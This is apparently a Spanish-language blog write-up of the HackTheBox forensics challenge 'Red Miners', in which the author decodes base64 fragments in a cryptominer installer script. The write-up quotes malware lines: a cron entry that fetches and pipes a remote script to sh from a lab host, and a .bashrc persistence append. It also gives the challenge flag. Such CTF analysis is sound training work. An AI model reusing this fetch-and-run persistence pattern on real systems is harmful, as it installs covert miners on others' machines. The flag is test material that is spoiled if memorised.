@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Red Miners / HTB Forensics</title>
+    <meta name="description" content="HackTheBox forensics challenge, easy">
+    <meta name="keywords" content='blogs, informatica, forense, porfolio, hacking, jaime gómez martínez, jaime gomez martinez, jaime gomez, challenge, forensics, bash, htb'>
+
+    <meta property="og:url" content="https://llo0zy.github.io/writeups/red-miners/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Red Miners / HTB Forensics">
+    <meta property="og:description" content="HackTheBox forensics challenge, easy">
+    <meta property="og:image" content="https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE">
+    <meta property="og:image:secure_url" content="https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Red Miners / HTB Forensics">
+    <meta name="twitter:description" content="HackTheBox forensics challenge, easy">
+    <meta property="twitter:domain" content="https://llo0zy.github.io/writeups/red-miners/">
+    <meta property="twitter:url" content="https://llo0zy.github.io/writeups/red-miners/">
+    <meta name="twitter:image" content="https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE">
+
+    
+    <link rel="canonical" href="https://llo0zy.github.io/writeups/red-miners/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.1cad96fd391c2b9ae7d512622db1ad1da8fd7f021e784b7b7697075309969323.js" integrity="sha256-HK2W/TkcK5rn1RJiLbGtHaj9fwIeeEt7dpcHUwmWkyM="></script>
+
+    
+    
+    Porfolio web | yoshl
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        <div class="avatar">
+            <a href="https://llo0zy.github.io/">
+                <img src='https://media.licdn.com/dms/image/D4D03AQFoKjKng-aj_w/profile-displayphoto-shrink_200_200/0/1691074052812?e=2147483647&v=beta&t=gsKoe1n-x31WkNFjxOcCjg3dVqLsqPuJ-d_I7JpS4bE' alt="avatar" />
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="https://llo0zy.github.io/">Jaime Gómez</a>
+        </div>
+        
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/posts/"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://llo0zy.github.io/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/Llo0zy"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/posts/"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://llo0zy.github.io/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/Llo0zy"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Red Miners / HTB Forensics</h1>
+        <small role="doc-subtitle">HackTheBox forensics challenge, easy</small>
+        <p class="post-date">
+            October 29, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/challenge">challenge</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/forensics">forensics</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/bash">bash</a></li>
+        
+            <li class="post-tag"><a href="https://llo0zy.github.io/tags/htb">htb</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="misión">Misión</h1>
+<p><em>In the race for Vitalium on Mars, the villainous Board of Arodor resorted to desperate measures, needing funds for their mining attempts. They devised a botnet specifically crafted to mine cryptocurrency covertly. We stumbled upon a sample of Arodor&rsquo;s miner&rsquo;s installer on our server. Recognizing the gravity of the situation, we launched a thorough investigation. With you as its leader, you need to unravel the inner workings of the installation mechanism. The discovery served as a turning point, revealing the extent of Arodor&rsquo;s desperation. However, the battle for Vitalium continued, urging us to remain vigilant and adapt our cyber defenses to counter future threats.</em></p>
+<h1 id="leyendo-el-archivo-sh">Leyendo el archivo .sh</h1>
+<p>Encontramos un largo archivo escrito en <strong>bash</strong> en el cual si nos damos cuenta hay partes fraccionadas de código <em>Base64</em> y decidimos filtrar por los caracteres: <strong>g==</strong> caracteres muy comunes en este tipo de encriptado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat miner_installer.sh | grep <span style="color:#e6db74">&#34;g==&#34;</span>
+  local url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://tossacoin.htb/cGFydDI9Il90aDMxcl93NHkiCg==&#34;</span>
+  dest<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;X3QwX200cnN9Cg==&#34;</span>|base64 -d<span style="color:#66d9ef">)</span>
+echo <span style="color:#e6db74">&#34;ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==&#34;</span> | base64 -d &gt;&gt; /home/$USER/.bashrc
+    echo <span style="color:#e6db74">&#39;* * * * * $LDR http://tossacoin.htb/ex.sh | sh &amp; echo -n cGFydDE9IkhUQnttMW4xbmciCg==|base64 -d &gt; /dev/null 2&gt;&amp;1&#39;</span>
+</code></pre></div><h2 id="desencriptado-archivo--flag">Desencriptado archivo + flag</h2>
+<p>Aquí vamos a obtener todo el texto en <em>Base64</em> y desencriptarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo -n cGFydDI9Il90aDMxcl93NHkiCg<span style="color:#f92672">==</span>|base64 -d
+part2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_th31r_w4y&#34;</span>
+
+$ echo <span style="color:#e6db74">&#34;X3QwX200cnN9Cg==&#34;</span>|base64 -d
+_t0_m4rs
+
+$ echo <span style="color:#e6db74">&#34;ZXhwb3J0IHBhcnQ0PSJfdGgzX3IzZF9wbDRuM3R9Ig==&#34;</span> | base64 -d
+export part4<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_th3_r3d_pl4n3t}&#34;</span>
+
+$ echo -n cGFydDE9IkhUQnttMW4xbmciCg<span style="color:#f92672">==</span>|base64 -d 
+part1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HTB{m1n1ng&#34;</span>
+</code></pre></div><p>Si juntamos todo con el orden marcado nos devuelve la cadena de texto -&gt; <code>HTB{m1n1ng_th31r_w4y_t0_m4rs_th3_r3d_pl4n3t}    </code></p>
+
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+            
+                
+<div class="prev-post">
+    <p>
+        <a href="/writeups/wrong-spooky-season/">
+            &#8592;
+            Previous:
+            Wrong Spooky Season / HTB Forensics
+        </a>
+    </p>
+    <p class="prev-post-date">
+        October 29, 2023
+    </p>
+</div>
+
+
+
+<div class="next-post">
+    <p>
+        <a href="/writeups/psexec-hunt/">
+            Next:
+            PsExec / CyberDefender
+            &#8594;
+        </a>
+    </p>
+        <p class="next-post-date">
+            October 29, 2023
+        </p>
+</div>
+
+
+            
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misión">Misión</a></li>
+    <li><a href="#leyendo-el-archivo-sh">Leyendo el archivo .sh</a>
+      <ul>
+        <li><a href="#desencriptado-archivo--flag">Desencriptado archivo + flag</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>
+        © 2023 - All rights reserved
+    </span>
+</footer>
+</body>
+</html>
